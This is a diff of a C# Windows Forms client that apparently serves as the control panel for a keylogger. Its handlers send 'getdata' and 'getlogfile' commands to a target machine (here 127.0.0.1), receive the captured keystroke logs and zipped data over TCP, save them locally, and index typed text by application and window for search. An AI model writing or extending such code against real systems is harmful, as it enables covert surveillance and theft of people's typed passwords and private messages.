@@ -34,17 +34,87 @@ namespace IdpaClient
             GetKeyLoggerData();
         }
 
+        //UI Events
+
         private void Form1_Load(object sender, EventArgs e)
         {
             adressInfo.Start();
         }
 
-        
+        private void getData_Click(object sender, EventArgs e)
+        {
+            print("Starting download...");
+            adressInfo.Stop();
+            if (ConnectionManager.SendCommand("127.0.0.1", "getdata"))
+            {
+                //Task.Factory.StartNew(() => ConnectionManager.startAsyncTCPListener(2));
+                Task t = new Task(() => ConnectionManager.startAsyncTCPListener(2));
+                t.Start(TaskScheduler.FromCurrentSynchronizationContext());
+            }
+            else print("Target not available");
+            adressInfo.Start();
+        }
+
+        private async void refreshLogFile_Click(object sender, EventArgs e)
+        {
+            adressInfo.Stop();
+            if (ConnectionManager.SendCommand("127.0.0.1", "getlogfile"))
+            {
+                Task t = new Task(() => ConnectionManager.startAsyncTCPListener(1));
+                t.Start(TaskScheduler.FromCurrentSynchronizationContext());
+            }
+            else print("Target not available");
+            adressInfo.Start();
+        }
+
+        private void search_Click(object sender, EventArgs e)
+        {
+            Search();
+        }
+
+        private void searchBox_OnKeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.KeyData == Keys.Return)
+                Search();
+        }
+
+        private void radioText_CheckedChanged(object sender, EventArgs e)
+        {
+            searchBox.AutoCompleteCustomSource = textSource;
+        }
+
+        private void radioAName_CheckedChanged(object sender, EventArgs e)
+        {
+            searchBox.AutoCompleteCustomSource = aNameSource;
+        }
+
+        private void radioWName_CheckedChanged(object sender, EventArgs e)
+        {
+            searchBox.AutoCompleteCustomSource = wNameSource;
+        }
+
+        private void radioDate_CheckedChanged(object sender, EventArgs e)
+        {
+            searchBox.AutoCompleteCustomSource = dateSource;
+        }
+
+        //Timers
+
+        private void adressInfo_Tick(object sender, EventArgs e)
+        {
+            Task t = new Task(() => getPcInformations());
+            t.Start(TaskScheduler.FromCurrentSynchronizationContext());
+            //pingServer();
+        }
+
         private void GetKeyLoggerData()
         {
             if (!File.Exists(LOG_PATH))
+            {
+                print("No Logfile Found");
                 return;
-
+            }
+                
             logger = Serilizer.getDataFromFile(LOG_PATH, logger);
 
             foreach (ApplicationLog app in logger.applicationLog)
@@ -81,31 +151,6 @@ namespace IdpaClient
             }
 
             searchBox.AutoCompleteCustomSource = textSource;
-        }
-
-        private void getData_Click(object sender, EventArgs e)
-        {
-            print("Starting download...");
-            adressInfo.Stop();
-            if (ConnectionManager.SendCommand("127.0.0.1", "getdata"))
-            {
-                Task.Factory.StartNew(() => ConnectionManager.startAsyncTCPListener(2));
-            }
-            else print("Target not available");
-            adressInfo.Start();
-        }
-
-        private void adressInfo_Tick(object sender, EventArgs e)
-        {
-            Task t = new Task(() => getPcInformations());
-            t.Start(TaskScheduler.FromCurrentSynchronizationContext());
-            pingServer();
-        }
-
-        private async void pingServer()
-        {
-            double ping = await ConnectionManager.Ping("127.0.0.1");
-            pcPingData.Text = ping.ToString();
         }
 
         private void getPcInformations()
@@ -151,15 +196,10 @@ namespace IdpaClient
             }
         }
 
-        private void search_Click(object sender, EventArgs e)
+        private async void pingServer()
         {
-            Search();
-        }
-
-        private void searchBox_OnKeyDown(object sender, KeyEventArgs e)
-        {
-            if (e.KeyData == Keys.Return)
-                Search();
+            double ping = await ConnectionManager.Ping("127.0.0.1");
+            pcPingData.Text = ping.ToString();
         }
 
         private void Search()
@@ -387,52 +427,21 @@ namespace IdpaClient
             return text;
         }
 
-        private void radioText_CheckedChanged(object sender, EventArgs e)
-        {
-            searchBox.AutoCompleteCustomSource = textSource;
-        }
-
-        private void radioAName_CheckedChanged(object sender, EventArgs e)
-        {
-            searchBox.AutoCompleteCustomSource = aNameSource;
-        }
-
-        private void radioWName_CheckedChanged(object sender, EventArgs e)
-        {
-            searchBox.AutoCompleteCustomSource = wNameSource;
-        }
-
-        private void radioDate_CheckedChanged(object sender, EventArgs e)
-        {
-            searchBox.AutoCompleteCustomSource = dateSource;
-        }
-
         public void print(string msg)
         {
             eventLog.AppendText(msg + "\r\n");
         }
 
-        public static void storeData(byte[] data)
+        public void storeData(byte[] data)
         {
             FileManager.SaveZipFile(data, @"C:\Temp\zipTest.zip");
         }
 
-        public static void storeLogFile(byte[] data)
+        public void storeLogFile(byte[] data)
         {
             FileManager.SaveLogFile(data, @"C:\Temp\log_send.xml");
+            GetKeyLoggerData();
         }
-
-        private async void refreshLogFile_Click(object sender, EventArgs e)
-        {
-            adressInfo.Stop();
-            if(ConnectionManager.SendCommand("127.0.0.1", "getlogfile"))
-            {
-                await Task.Factory.StartNew(() => ConnectionManager.startAsyncTCPListener(1));
-                GetKeyLoggerData();
-            }
-            adressInfo.Start();
-        }
-
 
         //public static int BinSearch(ref int[] x, int searchValue)
         //{
